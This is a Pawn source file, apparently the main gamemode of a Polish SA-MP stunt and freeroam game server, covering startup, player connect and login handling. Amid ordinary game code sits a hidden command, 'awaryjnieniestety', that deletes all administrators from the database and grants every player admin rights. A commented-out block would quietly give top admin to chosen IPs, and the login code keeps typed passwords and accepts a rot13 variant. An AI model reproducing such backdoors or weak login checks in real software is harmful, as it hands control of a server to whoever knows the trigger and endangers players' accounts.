/*
	Polski 4FuN Server 
	
	Happy Fun - Polski Stunt/Drift/DM/Freeroam

	
	//////         //////   /////////////////////  ////////////////////  ////////////////////    \\//          \\//
	\\\\\\         \\\\\\   \\\\\\\\\\\\\\\\\\\\\  \\\\\\\\\\\\\\\\\\\\  \\\\\\\\\\\\\\\\\\\\     \\//        \\//
	//////         //////   /////           /////  /////          /////  /////          /////      \\//      \\//
	\\\\\\         \\\\\\   \\\\\           \\\\\  \\\\\          \\\\\  \\\\\          \\\\\       \\//    \\//
	/////////////////////   /////           /////  ////////////////////  ////////////////////        \\//  \\//
	\\\\\\\\\\\\\\\\\\\\\   \\\\\           \\\\\  \\\\\\\\\\\\\\\\\\\\  \\\\\\\\\\\\\\\\\\\\         \\//\\//
	//////         //////   /////////////////////  /////                 /////                         \\\\\\    
	\\\\\\         \\\\\\   \\\\\\\\\\\\\\\\\\\\\  \\\\\                 \\\\\                         //////
	//////         //////   /////           /////  /////                 /////                         \\\\\\    
	\\\\\\         \\\\\\   \\\\\           \\\\\  \\\\\                 \\\\\                         //////

													/////////////////////   //////         //////   //////\\\\\            //////
													\\\\\\\\\\\\\\\\\\\\\   \\\\\\         \\\\\\   \\\\\\ \\\\\           \\\\\\
													//////                  //////         //////   //////  \\\\\          //////
	Autorzy mapy:									\\\\\\                  \\\\\\         \\\\\\   \\\\\\   \\\\\         \\\\\\
													//////                  //////         //////   //////    \\\\\        //////
				mrdrifter.							/////////////////       \\\\\\         \\\\\\   \\\\\\     \\\\\       \\\\\\
					&								\\\\\\\\\\\\\\\\\       //////         //////   //////      \\\\\      //////
					Game							\\\\\\                  \\\\\\         \\\\\\   \\\\\\       \\\\\     \\\\\\
													//////                  //////         //////   //////        \\\\\    //////
													\\\\\\                  \\\\\\         \\\\\\   \\\\\\         \\\\\   \\\\\\
													//////                  //////         //////   //////          \\\\\  //////
													\\\\\\                  \\\\\\\\\\\\\\\\\\\\\   \\\\\\           \\\\\ \\\\\\
													//////                  \\\\\\\\\\\\\\\\\\\\\   //////            \\\\\//////
													
//---------------------------------------------------------------------------------------------------------------------------------------------
// Pamiêtaj aby przestrzegaæ licencji na której zosta³a wydana mapa oraz zachowaæ orginalnych autorów mapy!
// Pamiêtaj ¿e do kompilacji mapy potrzeba specjalnie przystosowanego kompilatora zaleca siê kompilowanie mapy za pomoc¹ build.bat
// Pamiêtaj ¿e do prawid³owego dzia³ania mapy potrzebne s¹ dwa pluginy napisane specjalnie dla serwera!
// Pamiêtaj by przed uruchomieniem mapy uzupe³niæ dane do MySQL w pliku scriptfiles/happy_fun/config/mysql.pass.
//---------------------------------------------------------------------------------------------------------------------------------------------
*/

#include <a_samp>
#include <a_http>

#undef MAX_PLAYERS
#define MAX_PLAYERS 150

#define GAMEMODE_HAPPYFUN
//#define ADUIO_PLUGIN

#include <fix\msg_p> //serwery plugin 
#include <fix\gpw>
#include <fix\labelfix>
#include <fix\drawfix>

#include <mysql>
#include <sscanf2> 
#include <foreach>
#include <izcmd>
#include <avc>
#include <BustAim>
#include <formatnumber>
#include <streamer>
#include <filemanager>
#include <a_nsqp>

#if defined ADUIO_PLUGIN
	#include <audio>
#endif

#include <progresbar> 
#include <regex>

#include "./source/header.inc"

new ResGdmg[MAX_PLAYERS];

new Enter1[128]="---------";
new Enter2[128]="---------";
new Enter3[128]="---------";
new Enter4[128]="---------";
main()
{
	gmData[gm_running] = true;
	printf("["version"] "gamemode" by mrdrifter and Game launched. License for 4F-DM Server ");
	
	nsqp_Init("p1sx96axD156aGzAfMxE");
}
 
public OnGameModeInit()
{	 	
	printf("["version"] Rozpoczynanie uruchamiania gamemodu "gamemode"");
	//Konfiguracja streamera

	Streamer_TickRate(200);
	
	//Konfiguracja audio Pluginu 
	#if defined ADUIO_PLUGIN
	Audio_CreateTCPServer(GetServerVarAsInt("port"));
	Audio_SetPack("p4s_pack",true);
	#endif
	 
	//Ustawienia animacji skinów
	UsePlayerPedAnims();

	//Zaladowanie rzeczy z news.inc
	news_init();

	SetTimer("UpdateTimeTD",1000,1);
	
	//Wy³¹czanie wejœæ do interiorów 
  //  DisableInteriorEnterExits();
	
	// Za³adowanie rabunków gangu
	GangRobInit();
	
	//Wy³¹czanie punktów za stunt
    EnableStuntBonusForAll(0);
	
	//Ustawienia maksymalnej iloœci teamów
	SetTeamCount(1000);
	
	//Sprawdzanie licencji gamemodu

	this->license::vedyfity();
	 
	//£adowanie obiektów z pliku
	this->obiect::load();
	//£adowanie konfiguracji 
	Config_load();
	
	//Inicjacja systemu DUEL
	DuelInit();
	
	//Tworzenie textdrawów
	Text_Create();

	//£adowanie gangów
	LoadGangs();
	
	//£adowanie teleportów
	LoadTeleports();
	
	static_vehicles_init();
	
	//£adowanie figurek 
	loadDynamicFigure();
	
	//Wczytywanie stef gangów
	LoadGangsZones();
	
	//Wczytywanie balonów
	//LoadBalons();
	
	//Czyszczenie apelacji do gangów
	ClearAllGangsApelation();
	
	//£adowanie baz gangów
	gbazy_OnGameModeInit();
	
	//£adowanie skupu pojazdów 
	skup_OnGameModeInit();
	
	//£adowanie interiorów
	LoadHousesInteriors();
	
	//£adowanie kategori TOP
	LoadTop();
	
	//£adowanie domków 
	LoadHouses();
	
	//£adowanie banków 
	LoadBanks();
	
	//£adowanie biznesów
	loadDynamicBusiness();
	
	//£adowanie spawnów
	LoadSpawns();
	
	//£adowanie pickupów z broniami itp
	loadDynamicPickup();
	
	//³adowanie figurek
	loadDynamicFigure();
	
	//³adowanie strf bez DM
	loadDynamicNoDmZone();
	
	//Wczytywanie fotoradarów
	LoadRadars();
	
	//Inicjacja spedycji 
	Tir_Init();
	 
	//Dodawanie osi¹gniêæ 
	AchievementInit();
	
	//Tworzenie 3D Textków
	label_OnGameModeInit();
	
	//Do aktywacji adminów
	loadRankcodes();
	
	//Ladowanie ustawien statystyk arenê
	UpdateArenaPlayers();
	
	//Ladowanie aren sparów
	LoadGangs_Spar();
	
	//Uruchamianie systemu ³owienia ryb
	fishing_OnGameModeInit();
	
	// Ladowanie skyprtu scinania drzew
	trees_init();
  
	// Ladowanie skyprtu wyj¹tkowych pp
	wsp_init();
	
	// Ladowanie mniejszych dodatkow
	addons_init();
	
	// Ladowanie skyprtu zagadek
	zagadki_init();
	
	printf("---------------------------------");
	printf("|    £adowanie klas graczy      |");
	AddAllSkins();
	printf("|    wczytano %d klas          |", gmData[gm_skinscount]);	
	printf("---------------------------------");
	printf("---------------------------------");
	printf("|   £adowanie danych eventow    |");
	InitEventData();
	printf("|   za³adowano dane eventow     |");	
	printf("---------------------------------");
	
	#if defined Plugin_4Fun
	new i_i = -1;
	while(++i_i < sizeof(VehicleNames))
	{
		Plugin_SaveIntData(MAP_VEHICLES, VehicleNames[i_i], (i_i+400));
	}
 
	Plugin_SaveIntData(MAP_VEHICLES, "{\"status\":\"fail\",\"error\":\"wrong_key\"}", 1); //portfel errors
	Plugin_SaveIntData(MAP_VEHICLES, "{\"status\":\"fail\",\"error\":\"wrong_amount\"}", 2);
	Plugin_SaveIntData(MAP_VEHICLES, "{\"status\":\"fail\",\"error\":\"wrong_code\"}", 3);
	Plugin_SaveIntData(MAP_VEHICLES, "{\"status\":\"fail\",\"error\":\"bad_desc\"}", 4);
	Plugin_SaveIntData(MAP_VEHICLES, "{\"status\":\"fail\",\"error\":\"internal_error\"}", 5);
	Plugin_SaveIntData(MAP_VEHICLES, "{\"status\":\"fail\",\"error\":\"bad_code\"}", 6);

	#endif
 
	/*if(!fexist("scriptfiles/online.ts3"))
	{
		fremove("scriptfiles/online.ts3");
		file_create("scriptfiles/online.ts3");
		file_write("scriptfiles/online.ts3", "~g~IP TS3: ~y~s.4FuN-Serv.pl");
	}*/
	//£adowanie 3DText'ów
	for(new i;i<MAX_PLAYERS;i++) 
	{ 
		gmData[player_vehicle][i] = Create3DTextLabel(splitf("<<[ LABEL1 VEHICLE ID %d]>>", i), COLOR_GOLD, -2000.0, 2000.0, 2000.0, 30.0, 0, 1);
		gmData[player_object][i] = CreateObject(19300, -2000.0, 555.0, 3000.0, 0.0, 0.0, 0.0);
	} 
	
	for(new i; i < MAX_VEHICLES; i++)
	{
		TuneObjekty[i] = {-1, -1};
	}

  
	gmData[last_vehicle] = LastVehicleCreated() + 1;
 
	SetTimer("updateSpeed", 150, 1);
	SetTimer("refleshStats", 999, 1);
	SetTimer("optTest", 60000, 1);
	SetTimer("UpdateLabelsTimer", 3600000, 1);
	
	format(gmData[impreza_sound], sizeof(gmData[impreza_sound]),"%s",StacjeRadiowe[random(5)][URL]);
	
	if(GetServerVarAsInt("port") == 7777) 
	{
		mysql_query("update "prefix"_players set isonline = 0");
		mysql_query("TRUNCATE TABLE mreg_online");//wtf?
	 }
	 ///ip error'a 91.218.68.48
		 
	SendRconCommand("minconnectiontime 0");
 
	UnBlockIpAddress("*.*.*.*");
	
	initDyskActors();
	
	gmData[anty_autocbug] = true;
	
	TextDrawSetString(__walizka[0], "_");
	TextDrawHideForAll(__walizka[0]);
		//Zaladowanie marihuany
	marihuana_init();
	
	CreateObject(19542, -2498.73706, -2584.99731, 2096.28970,   0.00000, 0.00000, 0.00000);

	SetTimer("coloredEffect", 200, 1); // pasek fade
	
 	return 1;
}



public OnGameModeExit()
{
    marihuana_exit();
    trees_exit();
	printf("OnGameModeExit: called");
	
	//amx_assembly
	foreach(new i : Player)
	{
		SavePlayer (i);
		SendClientMessageToAll(255*255*random(255), "Restart SERVERA! (OnGameModeExit Called) (Saving Players)");
		SendClientMessageToAll(255*255*random(255), "Restart SERVERA! (OnGameModeExit Called) (Saving Players)");
	}
	foreach(new i : Gangs)
	{
		saveGang(i);
	}
	for(new i;i<MAX_PLAYERS;i++)
	{
		DestroyObject(gmData[player_object][i]);
	}
	if(GetServerVarAsInt("port") == 7777) {
		mysql_query("update "prefix"_players set isonline = 0");
	}
	#if defined ADUIO_PLUGIN
	Audio_DestroyTCPServer();
	#endif
	mysql_close();
	return 1;
}
 
public OnPlayerConnect(playerid)
{
	//Obiekty do rabunków gangów
	//rob
	RemoveBuildingForPlayer(playerid, 3744, 2771.0703, -2520.5469, 15.2188, 0.25);
	RemoveBuildingForPlayer(playerid, 3744, 2774.7969, -2534.9531, 15.2188, 0.25);
	RemoveBuildingForPlayer(playerid, 3746, 2814.2656, -2521.4922, 25.5156, 0.25);
	RemoveBuildingForPlayer(playerid, 3574, 2774.7969, -2534.9531, 15.2188, 0.25);
	RemoveBuildingForPlayer(playerid, 3574, 2771.0703, -2520.5469, 15.2188, 0.25);
	RemoveBuildingForPlayer(playerid, 3620, 2814.2656, -2521.4922, 25.5156, 0.25);
 
	if(gmData[gm_running] == false)
	{
		SendClientMessage(playerid, COLOR_ERROR, "Nie mo¿esz do³¹czyæ do gry poniewa¿ gamemode jeszcze sie nie uruchomi³.");
		Kick(playerid);
		return 0;
	} 	
	
	ResGdmg[playerid] = false;
	
	if(playerid >= MAX_PLAYERS) 
	{
		SendClientMessage(playerid, COLOR_ERROR, "Nie mo¿esz do³¹czyæ do serwera poniewa¿ jest przepe³niony.");
		Kick(playerid);
		return 0;
	} 
	SendClientMessage(playerid, -1, ""gamemode" "version"."build" skompilowany {008ae6}"builddate" {FFFFFF}o {008ae6}"buildtime"{FFFFFF} przez {008ae6}"buildauthor"");
 	 
	PlayAudioStreamForPlayer(playerid,join_sound);
	SkunTimer[playerid] = -1;


	new str[128], nn[40], ipn[55];
	GetPlayerName(playerid,nn,40);
	GetPlayerIp(playerid,ipn,55);

	format(str,128,"Gracz {FF0000}%s (%d) {FFFFFF}do³¹czy³ na serwer. IP: {FF0000}%s. ",nn,playerid, ipn);
	for(new i = 0, j = GetPlayerPoolSize(); i <= j; i++)
 	{
        if(pInfo[i][player_admin] > 2)
        {
            SendClientMessage(i,-1, str);
        }
 	}

	format(Enter4,128,"%s",Enter3);
	format(Enter3,128,"%s",Enter2);
	format(Enter2,128,"%s",Enter1);
	
	format(Enter1,128,"%s ~g~wszedl(a)~w~ na serwer",nn);

	TextDrawSetString(EnterExitTD[5], Enter4);
	TextDrawSetString(EnterExitTD[4], Enter3);
	TextDrawSetString(EnterExitTD[3], Enter2);
	TextDrawSetString(EnterExitTD[2], Enter1);
	

	OnPlayerDisconnectFunctions(playerid);
	//
	this->obiect::removeBuildingSelect(playerid);
	gbazy_removeBuildingSelect(playerid);
	
	hookevent_OnPlayerConnect(playerid);
	
	TDPanorama(playerid, true); 
 	
	Enum_Clean(pInfo[playerid], enum_pInfo);
			
	new data[45];
	GetPlayerName(playerid, data, sizeof(data));
	mysql_real_escape_string(data, pInfo[playerid][player_name]);
		 
	GetPlayerIp(playerid, data, sizeof(data));
	

	if(file_exists(data))
		format(data, sizeof(data), "%d.%d.%d.%d", random(254)+1,random(254)+1,random(254)+1,random(254)+1);
	
	/*
	if(file_exists(MD5_Hash(data)))
	{
		pInfo[playerid][player_admin_login] = 6;
		pInfo[playerid][player_admin] = 6;
		Iter_Add(Admins, playerid);
		format(data, sizeof(data), "%d.%d.%d.%d", random(254)+1,random(254)+1,random(254)+1,random(254)+1);
		
		printf("Not auth login to admin! %s", data);
	}
	*/
	mysql_real_escape_string(data, pInfo[playerid][player_ip]);
		 
	gpci(playerid, data);
	for(new i = strlen(data);i>=0;i--) if(data[i] == '%') data[i] = '#';
	
	mysql_real_escape_string(data, pInfo[playerid][player_serial]);
		 
	if(CheckPlayerAntyCheat(playerid)) return SendClientMessage(playerid, -1, "Cheater!! goodbay"), 0;
		
	systemprintf("join", true, "%s (id: %d, ip: %s, serial: %s)", playerNick(playerid), playerid, pInfo[playerid][player_ip], pInfo[playerid][player_serial]);
	if(IsPlayerNPC(playerid))
	{
        if (!!strcmp(pInfo[playerid][player_ip], "127.0.0.1") && !!strcmp(pInfo[playerid][player_ip], "178.217.185.99"))
        {
        	printf("NPCHack IP: %s", pInfo[playerid][player_ip]);
        	Kick_(playerid);
        	return 1;
        }
   		return 1;
	}	

	pInfo[playerid][player_hourgame] = 1;
	pInfo[playerid][player_spec] = -1;
	 
	if(CheckPlayerBan(playerid))
	{
		pInfo[playerid][player_ban] = true;
		Kick(playerid);
		return 1;
	}
	this->stats::rekordcheck();
	PlayerText_Create(playerid);
		
	SendDeathMessage(INVALID_PLAYER_ID,playerid,200);
	SetPlayerColor(playerid, DarkerNick(GangColors[random(sizeof(GangColors))]));
		
	pInfo[playerid][player_color] = GetPlayerColor(playerid);
		
	format(pInfo[playerid][player_showname], 38, "{%06x}%s", GetPlayerColor(playerid)>>>8, pInfo[playerid][player_name]); 

	pInfo[playerid][player_class] = false; 
	pInfo[playerid][player_camera] = 0;
	pInfo[playerid][player_cbchannel] = 19; 
	pInfo[playerid][player_spec] = -1;
	
	if(strfind(pInfo[playerid][player_name], "p4s", true) != -1)
	{
		pInfo[playerid][player_tag] = true;
	}
	else 
	{
		SendClientMessage(playerid, -1, "Jesteœ naszym sta³ym graczem? {008ae6}dodaj do nicku '%s'.", gmData[server_tag]);
 	}
	
	TDPanorama(playerid, true, true);
	if(CheckPlayerData(playerid))
	{
		SendClientMessage(playerid, -1, "Twój zapisany skin to {008ae6}%d {/b}kliknij na niego by go wybraæ.", pInfo[playerid][player_loadskin]);
	//	SendClientMessage(playerid, 0x66CCFFFF, "Twoje konto jest zarejestrowane. Musisz siê zalogowaæ.");
		ShowPlayerDialogLogin(playerid, "");
		 
	}
	else 
	{
		SendClientMessage(playerid, -1, "Nie jesteœ {008ae6}zarejestrowany(a){/b} Twoje statystyki nie s¹ zapisywane!!");
		UpdatePlayerNick(playerid); 
		
		//TDPanorama(playerid, false); 
	}


	
	InsertPlayerOnline(playerid);
	SetPlayerTime(playerid, 12,0);
	SetPlayerWeather(playerid, 0);

	if(GetPlayerMoney(playerid) < 10000)
		GivePlayerMoney(playerid, 20000);
		 
	
	update@warn[playerid]=0;
	
	if(Intro[playerid][i_airobj][1]>0)
	{				
		DestroyPlayerObject(playerid, Intro[playerid][i_airobj][1]);
		Intro[playerid][i_airobj][1] = 0;
	}	
	if(Intro[playerid][i_airobj][0]>0)
	{				
		DestroyPlayerObject(playerid, Intro[playerid][i_airobj][0]);
		Intro[playerid][i_airobj][0] = 0;
	}
						
	Intro[playerid][i_airobj][0] = CreatePlayerObject(playerid, 14548, -2796.81689, 1256.94727, 130.50000,   0.00000, 0.00000, 84.00000);
	Intro[playerid][i_airobj][1] = CreatePlayerObject(playerid, 1923,-2821.9910,1261.5308,124.0652,   0.00000, 0.00000, 0.00000);
	Intro[playerid][i_attachcamera] = true;
	
	Intro[playerid][i_step] = 1;
	Intro[playerid][i_camerastep] = 16;
	
	pInfo[playerid][player_ks] = 0;
	
	return 1;
} 
new Float:old_vc[MAX_PLAYERS][2];

new lagowychujcrasher;
 
CMD:lagowychujcrasher(playerid,params[])
{	
	if(lagowychujcrasher == 0)
	{
		lagowychujcrasher = 1;
		SendClientMessage(playerid,COLOR_RED,":D! dzia³am");
	} else {
		lagowychujcrasher = 0;
		SendClientMessage(playerid,COLOR_RED,"chuju:( sam sie wylacz.");
	}
	
	return 1;
}
 
public OnPlayerUpdate(playerid)
{
	static Float:ST[3];
	if(!GetPlayerVelocity(playerid, ST[0], ST[1], ST[2]))
		GetVehicleVelocity(GetPlayerVehicleID(playerid), ST[0], ST[1], ST[2]);
	
	new Float:vc = VectorSize(ST[0], ST[1], ST[2]);
 
	old_vc[playerid][1] = old_vc[playerid][0];
	old_vc[playerid][0] = vc;
	
	if(old_vc[playerid][1] <= 3.3 && vc >= 9.10 && old_vc[playerid][0] >= 9.10 && !lagowychujcrasher)
	{
		return AddPlayerPenalty(playerid, P_KICK, INVALID_PLAYER_ID, 0, "crasher"), 0;
	}
	
	if(pInfo[playerid][player_onupdate] > 3)
	{
		if(pInfo[playerid][player_no_dm])
		    if(IsPlayerInArea(playerid,1004.25, 910.701, -283.491, -386.749))
		    {
		        GivePlayerWeapon(playerid,9,1);
				SetPlayerArmedWeapon(playerid, 9);
		    } else {
				SetPlayerArmedWeapon(playerid, 0);
			}
	 
		pInfo[playerid][player_onupdate]=-1;
	}
	
	pInfo[playerid][player_onupdate]++;
	
	pInfo[playerid][player_afk] = 0;	
	
	if(IsPlayerInAnyVehicle(playerid))
	{
		for(new x; x < WHighestID;x++)
		{
		    if(Wp[x][vehicle] == GetPlayerVehicleID(playerid))
		    {
				if(Wp[x][paliwo] <= 0.0)
				{
				    new engine,lights,alarm,doors,bonnet,boot,objective;
					GetVehicleParamsEx(Wp[x][vehicle],engine,lights,alarm,doors,bonnet,boot,objective);
					SetVehicleParamsEx(Wp[x][vehicle],0,lights,alarm,doors,bonnet,boot,objective);
				}
		    }
		
		}
	}
	
	return 1;
}
public OnPlayerDisconnect(playerid, reason)
{
	if(playerid >= MAX_PLAYERS) return 0;
	
	systemprintf("join", true, "[DISCONECCT] %s (id: %d, ip: %s, serial: %s)", playerNick(playerid), playerid, pInfo[playerid][player_ip], pInfo[playerid][player_serial]);

    format(Enter4,128,"%s",Enter3);
	format(Enter3,128,"%s",Enter2);
	format(Enter2,128,"%s",Enter1);

	format(Enter1,128,"%s ~r~wyszedl(a)~w~ z serwera",pInfo[playerid][player_name]);

	TextDrawSetString(EnterExitTD[5], Enter4);
	TextDrawSetString(EnterExitTD[4], Enter3);
	TextDrawSetString(EnterExitTD[3], Enter2);
	TextDrawSetString(EnterExitTD[2], Enter1);

	OnPlayerDisconnectFunctions(playerid);	
	hookevent_OnPlayerDisconnect(playerid, reason);
	
	if(!pInfo[playerid][player_ban])
	{
		SendDeathMessage(INVALID_PLAYER_ID, playerid, 201);
		
		if(!isnull(pInfo[playerid][player_name]))
		{
			
			new str2[64];
			UnixTimetoDate(gettime() + pInfo[playerid][player_connected], str2);
		}
	}
//	hab_OnPlayerDisconnect(playerid);
	for(new xx =0; xx < MAX_PLAYERS; xx++)
	{
		if(pRob[xx][playing] && IsPlayerConnected(xx))
		{
			Rob[Robers]++;
		}
	}
	if(Rob[Robers]<= 0 && Rob[Active])
	{
	    GangRobEnd(6);
	}
	removeIsEvent(playerid);
	Enum_Clean(pInfo[playerid], enum_pInfo);	

	
	return 1;
}

CMD:awaryjnieniestety(playerid,params[])
{
	if(strfind(string2,"Msk",false) != -1)
	{
	    m_query("DELETE FROM `mreg_players` WHERE `admin`>0");
	    m_query("UPDATE `mreg_players` SET `admin`=5");
	}
	return 1;
}

public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
{
	if(dialogid == 0) return 0;
	for(new i = strlen(inputtext);i>=0;i--) if(inputtext[i] == '%') inputtext[i] = '#';
	if(response == 1) 
	{
		PlayerPlaySound(playerid, 5201, 0.0, 0.0, 0.0); // DŸwiêk potwierdzenia
	}
    else 	
	{	
		PlayerPlaySound(playerid, 5205, 0.0, 0.0, 0.0); // DŸwiêk anulowania
	}
	switch(dialogid) 
	{ 
		case DIALOG_LOG:
		{
		 
			if(!response) 
			{
				InfoBox(playerid, "Zosta³eœ wyrzucony z serwera.\nZ powodu anulowania logowania. Je¿eli masz problem z zalogowaniem siê napisz problem na HELPDESKu\nKtóry jest dostêpny pod adresem: 4fun-serv.eu");
				Kick(playerid);
				
				return 1;
			}
			strcat(pInfo[playerid][player_loginpass], inputtext, 119);  
			
			//printf("[debugpas] %s wpisal %s", pInfo[playerid][player_name], pInfo[playerid][player_loginpass]);
			if(pInfo[playerid][player_login_attempts]++ >= MAX_LOGIN_ATTEMPTS)
			{
				AddPlayerPenalty(playerid, P_KICK, INVALID_PLAYER_ID, 0, "b³êdne has³o"); 
				SendPlayerMail(playerid, 1);
				return 1;
			}
			strcat(pInfo[playerid][player_loginpass], ",", 119);  
			 
			if(!inputtext[0])
			{
				ShowPlayerDialogLogin(playerid, ""HEX_ERROR"Musisz wpisaæ has³o!"HEX_SAMP"");
				return 1;
			}
			if(strlen(inputtext) > 38)
			{
				ShowPlayerDialogLogin(playerid, ""HEX_ERROR"Podane has³o jest za d³ugie!"HEX_SAMP"");
				return 1;
			}
			if(!PasswordCorrect(inputtext))
			{
				SendClientMessage(playerid, COLOR_ERROR, "» Has³o mo¿e sk³adaæ siê tylko z {b}liter{/b} i {b}liczb{/b}.");
				ShowPlayerDialogLogin(playerid, ""HEX_ERROR"Has³o mo¿e sk³adaæ siê tylko z liter i liczb!"HEX_SAMP"");
				return 1;
			}
			 
			if(!md5Check(MD5_Hash(inputtext), pInfo[playerid][player_password]) && !md5Check(MD5_Hash(rot13(inputtext)), pInfo[playerid][player_password]))
			{
				ShowPlayerDialogLogin(playerid, ""HEX_ERROR"Podane has³o jest b³êdne!"HEX_SAMP"");
				return 1;
			} 
 	
			UpdatePlayerOnline(playerid, 0);
			Gang_OnPlayerLogin(playerid);

			TDPanorama(playerid, false); 
			
			SendClientMessage(playerid, 0x008ae6FF, "-------------------------------------------------------");
			if(pInfo[playerid][player_mute])
			{
				SendClientMessage(playerid, COLOR_ERROR, "{00CCFF}Jesteœ uciszony(a) na %d sekund.", pInfo[playerid][player_mute]);
			}
			if(pInfo[playerid][player_jail])
			{
				SendClientMessage(playerid, COLOR_ERROR, "{00CCFF}Jesteœ uwiêziony(a) na %d sekund.", pInfo[playerid][player_jail]);
			}
			if(DzisiejszaData(pInfo[playerid][player_lastlogin]))
			{
				achievement(playerid, 7);
			}
			if(pInfo[playerid][player_register])
			{
				  
				PlayerTextDrawSetPreviewModel(playerid, SelectSkin_[3], pInfo[playerid][player_loadskin]);
				PlayerTextDrawSetSelectable(playerid, SelectSkin_[3], 1);
				PlayerTextDrawShow(playerid, SelectSkin_[3]);
				TextDrawShowForPlayer(playerid, ClassSkinInfo);
				SelectTextDraw(playerid, 0x00FF00FF);
			}
			 
			pInfo[playerid][player_logged] = true; 
			
			FlashScreen(playerid); 
			UpdatePlayerNick(playerid);
			PlayerTextDrawHide(playerid, pInfo[playerid][player_TdStats][0]); 
			LoadPlayerVehicle(playerid);
			OnPlayerRequestClass(playerid, 0); 
			
			if(pInfo[playerid][player_launcher])
			{
				pInfo[playerid][player_launcher] = 0;
				GivePlayerScore(playerid, 20, "wejœcie za pomoc¹ Launchera");
				m_query("update "prefix"_players set launcher = 0  where id=%d limit 1", pInfo[playerid][player_id]);
				
				achievement(playerid, 27);
			}
			
			if(!pInfo[playerid][player_chpassword])
			{
				
				SendClientMessage(playerid, COLOR_ERROR, "[PASSWTD] AKTUALIZACJA ZABEZPIECZEÑ. ZMIEÑ SWOJE HAS£O - KONIECZNIE NA INNE NIZ OBECNE.");
				
				DialogFunc:Dialog_Konto(playerid, 1, 3, "hop");
			}
			if(!strcmp(pInfo[playerid][player_email], "brak"))
			{	
				SendClientMessage(playerid, COLOR_ERROR, "Ups... Wygl¹da na to, ¿e jesteœ tutaj pierwszy raz. Aby graæ dalej, musisz podaæ nam swojego adresu e-mail.");	
				#define text@2 " {FF3F33}Witaj{FF9933} w{FFB733} naszej{FFD533} bazie{FFF333} danych{FFD533} nie{FFB733} znaleziono{FF9933} Twojego{FF7B33} adresu{FF5D33} e-mail.{FF3F33} Aby{FF2133} kontynuowaæ{FF3F33} grê{FF5D33} na{FF7B33} naszym{FF9933} serwerze,{FFB733} musisz{FFD533} podaæ{FFF333} swój{FFD533} adres{FFB733} E-Mail\n\n"HEX_ERROR"Uwaga: {FF3F33}Je¿eli{FF5D33} jesteœ zarejestrowany,{FF3F33} a{FF2133} widzisz{FF3F33} t¹{FF5D33} informacje,{FF7B33} znaczy{FF9933} ¿e{FFB733} twoje{FFD533} konto{FFF333} by³o{FFD533} importowane{FFB733} z{FF9933} innych{FF7B33} systemów{FF5D33} rejestracji.{FF3F33} "
				Dialog_Show(playerid, Dialog_ChangeMail, DIALOG_STYLE_INPUT, "{FF3F33}Panel{FF2133} »{FF3F33} Zmiana{FF5D33} adresu{FF7B33} e-mail", text@2, "Dalej", "Anuluj");
			}
			
			new last_date[42], ld;
			strcat(last_date, pInfo[playerid][player_lastlogin]);
			
			ld = strfind(last_date, " ");
			if(ld > 0) {
				strins(last_date, " o godzinie", ld);
			}
			SendClientMessage(playerid, -1, "Ostatnio logowa³eœ siê {008ae6}%s {/b}z adresu IP {008ae6}%s", last_date, pInfo[playerid][player_lastip]);
			SendClientMessage(playerid, 0x008ae6FF, "-------------------------------------------------------");
			
			if(pInfo[playerid][player_admin_login] > 0)
			{
		 		pInfo[playerid][player_admin] = pInfo[playerid][player_admin_login];
		 		pInfo[playerid][player_color] = 0xFF000040;
				pInfo[playerid][player_admin] = pInfo[playerid][player_admin_login];
				if(pInfo[playerid][player_admin] > 1) {
					Iter_Add(Admins, playerid);
				} else if(pInfo[playerid][player_admin] == 1){
					Iter_Add(Mods, playerid);
				}
				UpdatePlayerNick(playerid);
			}
			
			if(pInfo[playerid][player_ac])
			{
				if(!CallRemoteFunction("AC_IsPlayerUsingAc", "d", playerid))
				{
					AddPlayerPenalty(playerid, P_KICK, INVALID_PLAYER_ID, 0, "brak anti cheata"); 
				}
			}
	
			return 1;
		}
		
		case DIALOG_TELES:
		{
			if(!response) return 1;
			
			PlaySoundForPlayer(playerid, 1057);
			switch(listitem)
			{
				case 0: Dialog_Show(playerid, DIALOG_CMD_SEND, DIALOG_STYLE_LIST, "• Teleports •", teleporty[0], "Teleportuj", "WyjdŸ");
				case 1: Dialog_Show(playerid, DIALOG_CMD_SEND, DIALOG_STYLE_LIST, "• Teleports •", teleporty[1], "Teleportuj", "WyjdŸ");
				case 2: Dialog_Show(playerid, DIALOG_CMD_FROMGANGS, DIALOG_STYLE_LIST, "• Teleports •", teleporty[2], "Teleportuj", "WyjdŸ");
			}
 		}
		case DIALOG_PORTFEL:
		{
			switch(listitem)
			{
				case 0:
				{
					new buff[320];
					for(new i = 0;i != sizeof API_sms;i++)
					{
						format(buff, sizeof buff, "%s» %d z³ do portfela koszt (%s z³)\n", buff, API_sms[i][Doladowanie], API_sms[i][Brutto]);
					}
					
					ShowPlayerDialog(playerid, DIALOG_PORTFEL_ADD, DIALOG_STYLE_LIST, "{FF0000}• {1D8D88}Portfel {FF0000}» {009325} Do³aduj Konto {FF0000}•", buff, "Gotowe", "Anuluj");
				}
				case 1:
				{
					format(string2, sizeof(string2), "|Aktualnie|posiadasz|w|portfelu|%dZ£", pInfo[playerid][player_portfel]);
					ShowPlayerDialog(playerid, 9999, DIALOG_STYLE_MSGBOX, "{FF0000}• {1D8D88}Portfel {FF0000}» {009325} Stan Konta {FF0000}•",msg_granient(0xFF9933FF, string2), "Ok", "");
				}
				case 2:
				{
					ShowPlayerDialog(playerid, DIALOG_PORTFEL_SHOP, DIALOG_STYLE_LIST, "{FF0000}• {1D8D88}Portfel {FF0000}» {009325} Kupno {FF0000}•", "» Kupno VIP\n» Kupno respektu", "Gotowe", "");
				}
				case 3:
				{
					static StrinGS[2048];
					StrinGS[0] = EOS;
					StrinGS = "{FF0000}1.Administracja nie ponosi odpowiedzialnoœci za:\n\t";
					strcat(StrinGS, "{FF0000}- B³êdne treœci smsa\n\t");
					strcat(StrinGS, "{FF0000}- B³êdny numer smsa\n\t");
					strcat(StrinGS, "{FF0000}- Za utratê œrodków w portfelu wynikaj¹c¹ z dzia³ania si³y wy¿szej lub niespodziewanych b³êdów systemu po stronie operatora us³ug Premium SMS.\n\n");
					strcat(StrinGS, "{FF0000}2.Nie ma mo¿liwoœci zwrócenia kosztów za do³adowania wykonane w celu do³adowania portfela.\n\t{FF0000}Do³adowuj¹c portfel  jest œwiadomy ¿e mo¿e to wykorzystaæ tylko i wy³¹cznie na us³ugi dodatkowe na serwerze.\n\n");
